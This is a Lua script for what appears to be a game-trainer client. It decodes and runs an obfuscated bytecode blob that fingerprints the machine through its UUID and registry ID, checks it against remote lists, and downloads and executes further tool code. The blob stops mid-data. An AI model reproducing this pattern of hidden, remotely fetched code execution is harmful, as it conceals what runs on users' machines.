function b64()
	local base64 = {}

local extract = _G.bit32 and _G.bit32.extract -- Lua 5.2/Lua 5.3 in compatibility mode
if not extract then
	if _G.bit then -- LuaJIT
		local shl, shr, band = _G.bit.lshift, _G.bit.rshift, _G.bit.band
		extract = function( v, from, width )
			return band( shr( v, from ), shl( 1, width ) - 1 )
		end
	elseif _G._VERSION == "Lua 5.1" then
		extract = function( v, from, width )
			local w = 0
			local flag = 2^from
			for i = 0, width-1 do
				local flag2 = flag + flag
				if v % flag2 >= flag then
					w = w + 2^i
				end
				flag = flag2
			end
			return w
		end
	else -- Lua 5.3+
		extract = load[[return function( v, from, width )
			return ( v >> from ) & ((1 << width) - 1)
		end]]()
	end
end


function base64.makeencoder( s62, s63, spad )
	local encoder = {}
	for b64code, char in pairs{[0]='A','B','C','D','E','F','G','H','I','J',
		'K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y',
		'Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n',
		'o','p','q','r','s','t','u','v','w','x','y','z','0','1','2',
		'3','4','5','6','7','8','9',s62 or '+',s63 or'/',spad or'='} do
		encoder[b64code] = char:byte()
	end
	return encoder
end

function base64.makedecoder( s62, s63, spad )
	local decoder = {}
	for b64code, charcode in pairs( base64.makeencoder( s62, s63, spad )) do
		decoder[charcode] = b64code
	end
	return decoder
end

local DEFAULT_ENCODER = base64.makeencoder()
local DEFAULT_DECODER = base64.makedecoder()

local char, concat = string.char, table.concat

function base64.encode( str, encoder, usecaching )
	encoder = encoder or DEFAULT_ENCODER
	local t, k, n = {}, 1, #str
	local lastn = n % 3
	local cache = {}
	for i = 1, n-lastn, 3 do
		local a, b, c = str:byte( i, i+2 )
		local v = a*0x10000 + b*0x100 + c
		local s
		if usecaching then
			s = cache[v]
			if not s then
				s = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[extract(v,0,6)])
				cache[v] = s
			end
		else
			s = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[extract(v,0,6)])
		end
		t[k] = s
		k = k + 1
	end
	if lastn == 2 then
		local a, b = str:byte( n-1, n )
		local v = a*0x10000 + b*0x100
		t[k] = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[extract(v,6,6)], encoder[64])
	elseif lastn == 1 then
		local v = str:byte( n )*0x10000
		t[k] = char(encoder[extract(v,18,6)], encoder[extract(v,12,6)], encoder[64], encoder[64])
	end
	return concat( t )
end

function base64.decode( b64, decoder, usecaching )
	decoder = decoder or DEFAULT_DECODER
	local pattern = '[^%w%+%/%=]'
	if decoder then
		local s62, s63
		for charcode, b64code in pairs( decoder ) do
			if b64code == 62 then s62 = charcode
			elseif b64code == 63 then s63 = charcode
			end
		end
		pattern = ('[^%%w%%%s%%%s%%=]'):format( char(s62), char(s63) )
	end
	b64 = b64:gsub( pattern, '' )
	local cache = usecaching and {}
	local t, k = {}, 1
	local n = #b64
	local padding = b64:sub(-2) == '==' and 2 or b64:sub(-1) == '=' and 1 or 0
	for i = 1, padding > 0 and n-4 or n, 4 do
		local a, b, c, d = b64:byte( i, i+3 )
		local s
		if usecaching then
			local v0 = a*0x1000000 + b*0x10000 + c*0x100 + d
			s = cache[v0]
			if not s then
				local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 + decoder[d]
				s = char( extract(v,16,8), extract(v,8,8), extract(v,0,8))
				cache[v0] = s
			end
		else
			local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40 + decoder[d]
			s = char( extract(v,16,8), extract(v,8,8), extract(v,0,8))
		end
		t[k] = s
		k = k + 1
	end
	if padding == 1 then
		local a, b, c = b64:byte( n-3, n-1 )
		local v = decoder[a]*0x40000 + decoder[b]*0x1000 + decoder[c]*0x40
		t[k] = char( extract(v,16,8), extract(v,8,8))
	elseif padding == 2 then
		local a, b = b64:byte( n-3, n-2 )
		local v = decoder[a]*0x40000 + decoder[b]*0x1000
		t[k] = char( extract(v,16,8))
	end
	return concat( t )
end

return base64
end

loadstring(b64().decode("G0x1YVMAGZMNChoKBAgECAh4VgAAAAAAAAAAAAAAKHdAAQAQAAAAXgMAAAAAG6gAAAAGAEAAJICAAAdAQAAKwECBBgBAACSAgAAHAEEAJECAAAYAQAAkgIAAbAAAAApAgIIGgEEAB8BBACSAgABBAAIAhoBBAIfAQQGkgIAAwQACAAFBAgBBgQIAgcECAMaBQQDHAcMDAUIDAOSBAAEBggMA3QGCAwHCAwBBwgMAgcIDAMECBAABwwMARAMAAIMDAADDAwAABAQAAEZERAAfwMIIHkAAgAGEBAAeAACAAcQEAEHEAgCBxAIAwQQFAAQFAABGRUUAhoVFAMaFRQABxgUA5AUAAaSFAADBBQYAAwaAAGSFAAIABYAKIkUAAB5AA4BGRUUAhoVFAMZFRgDHhcYLAcYGAEaGRQCBBgcAZAYAAeQFAACkhQAAwQUGAAMGgABkhQACAAWACkQFAACGRUcAxkVGAMeFxwsGRkYAB8ZHDEAGAAokhgABQQYIAOQFgAGkhQAAQAUAC6xFAAAIgIWQrIUAAAiABZGsxQAACICFkawFAQAIgAWSrEUBAAiAhZKshQEACIAFk6zFAQAIgIWTrAUCAAiABZSsRQIACICFlKyFAgAIgAWVrMUCAAiAhZWsBQMACIAFlqxFAwAIgIWWrIUDAAiABZesxQMACICFl4bFSADABYAFpIUAAQADAAuGBUwAh0VMC8AFAAYBhgwAQcYMAKSFAAIAAwALhkVIAKSFgABAAgALhgVMAIdFTAvABYAEAYYMAEEGDQCkhQACQAIAC4AFAAbABYAEncIFC6wFBAAIgIWarEUEAAiABZushQQACICFm6zFBAAIgAWcrAUFAAiAhZysRQUACIAFnYbFTgDshQUApEUAAazFBQAIgAWehkVPAMYFTwCkRQABrAUGAAiABZ+sRQYACICFn4bFTgDshQYApEUAASYAgABAAAAABA1nZXRMdWFFbmdpbmUEDmNiU2hvd09uUHJpbnQECENoZWNrZWQBAAQFaGlkZQQHT25TaG93BANvcwQGY2xvY2sTyAAAAAAAAAAT0AcAAAAAAAATAwAAAAAAAAATAAAAAAAAAAAEB2dldGVudgQMVVNFUlBST0ZJTEUECVxEZXNrdG9wBAEUR3JlZyBxdWVyeSBIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFNRTUNsaWVudCAvdiBNYWNoaW5lSWQECmhvc3RJbmRleBR4aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS9sN3M0ang3c2k3ZXpsZzZod3I4cDQvQ2xpZW50VGFibGVNZXRhLnR4dD9ybGtleT1ydHMwZmtmYzR5cXV1azFqdHBoa2JvZHV6JmRsPTAUXWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94WHhUVVJCT3hYL0JCU19WZXJzaW9uQ29udHJvbGxpbmcvbWFpbi9DbGllbnRUYWJsZU1ldGEudHh0EwUAAAAAAAAABBByZWFkU3RyaW5nTG9jYWwEEXJlYWRJbnRlZ2VyTG9jYWwEHUtFUk5FTEJBU0UuR2V0Q29tbWFuZExpbmVXKzETmgIAAAAAAAAEB3N0cmluZwQHZm9ybWF0BCBLRVJORUxCQVNFLkdldENvbW1hbmRMaW5lVys3KyVYBB1LRVJORUxCQVNFLkdldENvbW1hbmRMaW5lVyszBBxnZXRQcm9jZXNzSURGcm9tUHJvY2Vzc05hbWUEBm1hdGNoBAZsb3dlcgQLLipcKC4qZXhlKQQRZ2VuZXJhdGVEZXZpY2VJRAQTYWxsX3RyaW1fbWFjaGluZUlEBAd1c3JpZHMEDmdldElEX05ld1VzZXIEDGNoZWNrQWNjZXNzBApHVUlVcGRhdGUEJlR1cmJvX0NsaWVudF9EaXNjb3JkU2VydmVyQnV0dG9uQ2xpY2sEH1R1cmJvX0NsaWVudF9Cb29zdHlCdXR0b25DbGljawQfVHVyYm9fQ2xpZW50X1BheXBhbEJ1dHRvbkNsaWNrBB1UdXJib19DbGllbnRfS29maUJ1dHRvbkNsaWNrBBtUdXJib19DbGllbnRfQ29weVVVaWRDbGljawQfVHVyYm9fQ2xpZW50X2Z1bmNfbG9hZE1UMUNsaWNrBB9UdXJib19DbGllbnRfZnVuY19sb2FkTVQyQ2xpY2sEF1R1cmJvX0NsaWVudF9Gb3JtQ2xvc2UEDGNoZWNrVXBkYXRlBAdzdHJpbmcEBHN1YhMBAAAAAAAAABMTAAAAAAAAABMIAAAAAAAAAAQIR2V0TGluawQKZ2V0Q291bnRzBA1Gb2xkZXJFeGlzdHMECUtp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ZQQISGVsbG8sIAQOdGV4dF9tYWluSW5mbwQiU2VsZWN0IHZlcnNpb24gb2YgbW9kIHRvIGxvYWQuLi4gBCVUdXJib01vZFRvb2xWZXJzaW9uRGF0YV9iUU1yY2M2aG4yTUcEDFByZW1pdW1EYXRhBA1UYWJsZVZlcnNpb24TAAAAAAAAAAAEFm1hcmtfc3Vic2NyaXB0aW9uVHlwZQQTVHJpYWwgU3Vic2NyaXB0aW9uBA1mdW5jX2xvYWRNVDEEBUxvYWQEDEJvcmRlckNvbG9yE/yeAwAAAAAABAhFbmFibGVkAQEEDEJ1dHRvbkNvbG9yEz8/PwAAAAAABBVQcmVtaXVtIFN1YnNjcmlwdGlvbgQMVW5BdmFpbGFibGUECGNsV2hpdGUBABMbGxsAAAAAAAQQTm8gU3Vic2NyaXB0aW9uBAVtYXRoBAZmbG9vchMKAAAAAAAAAAQRSGVsbG8sIEZyZWUgVXNlcgQOVmlzaWJsZUZvckFsbAQKYmxvY2tfTVQxBAhWaXNpYmxlBA10ZXh0X25hbWVNVDEEBU5hbWUEBUZvbnQEBkNvbG9yBApOYW1lQ29sb3IEDXRleHRfaW5mb01UMQQR4oCiTW9kIFZlcnNpb246IAQIVmVyc2lvbgQNdGV4dF9pbmZvTVQ1BBbigKJGb3IgR2FtZSBWZXJzaW9uOiAEB0ZvckJCUwQNdGV4dF9pbmZvTVQ2BBHigKJMYXN0IFVwZGF0ZTogBAtMYXN0VXBkYXRlBA5pc1N0YWJsZUJ1aWxkBA5tYXJrX3N0YXRlTVQxEwC1AAAAAAAABAdTdGFibGUEC05vdCBTdGFibGUTtQAAAAAAAAAEFkFjY2Vzc0ZvclJlZ3VsYXJVc2VycwQUaXNDdXJyZW50RnJlZUFjY2VzcwQNdGV4dF9pbmZvTVQ3BB/igKJDdXJyZW50bHkgZnJlZSB0byBhY2Nlc3MuLi4EKOKAok9ubHkgRm9yIFN1YnNjcmliZXJzIGFuZCBUcmlhbCBVc2VycwQYVW5BdmFpbGFibGUsVXBkYXRpbmcuLi4EDUNsaWVudEhlYWRlcgQSdGV4dF9jbGllbnRIZWFkZXIEElR1cmJvIENsaWVudCB2MS4wBAlGcmVlRGF0YQQKYmxvY2tfTVQyBA10ZXh0X25hbWVNVDIEDXRleHRfaW5mb01UMgQNdGV4dF9pbmZvTVQ4BA10ZXh0X2luZm9NVDkEDm1hcmtfc3RhdGVNVDIEDnRleHRfaW5mb01UMTAEEeKAokZvciBBbGwgVXNlcnMEDWZ1bmNfbG9hZE1UMgQOU3BlY2lhbFRoYW5rcwQXdGV4dF9pbmZvQ2xpZW50VXBkYXRlMQQKVGhhbmtzTXNnBA9UaGFua3NNc2dDb2xvcgQOS2Vycm94Q3JlZGl0cwQSS2Vycm94UHJlbWl1bURhdGEECmJsb2NrX01UMwQPS2Vycm94RnJlZURhdGEECmJsb2NrX01UNAQOQ29tbXVuaXR5RGF0YQQKYmxvY2tfTVQ1BA5Db21tdW5pdHlUZXh0BBZDb21tdW5pdHlTZWN0aW9uVGl0bGUEFkNvbW11bml0eVNlY3Rpb25Db2xvcgQPRGlzY29yZFZpc2libGUEFERpc2NvcmRTZXJ2ZXJCdXR0b24EDkJvb3N0eVZpc2libGUEDUJvb3N0eUJ1dHRvbgQMS29maVZpc2libGUEC0tvZmlCdXR0b24EDlBheXBhbFZpc2libGUEDVBheXBhbEJ1dHRvbgcAAAAAAAEKAQ0BDgEPARIBEwAAAAAAAAAAAAAAAAAAAAAAlwEAAJkBAAABAAMEAAAARgBAAIFAAABkQAABJgCAAAIAAAAEDVNoZWxsRXhlY3V0ZQQeaHR0cHM6Ly9kaXNjb3JkLmdnL0N3SnZWWWVDR3oBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJsBAACdAQAAAQADBAAAAEYAQACBQAAAZEAAASYAgAACAAAABA1TaGVsbEV4ZWN1dGUEH2h0dHBzOi8vYm9vc3R5LnRvL3R1cmJvdHJhaW5lcgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnwEAAKEBAAABAAMEAAAARgBAAIFAAABkQAABJgCAAAIAAAAEDVNoZWxsRXhlY3V0ZQQeaHR0cHM6Ly9wYXlwYWwubWUvVHVyYm9NYW5jZXIBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKMBAAClAQAAAQADBAAAAEYAQACBQAAAZEAAASYAgAACAAAABA1TaGVsbEV4ZWN1dGUEHGh0dHBzOi8va28tZmkuY29tL3R1cmJvMzI1MgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwEAAKoBAAABAAQFAAAARgBAAIUA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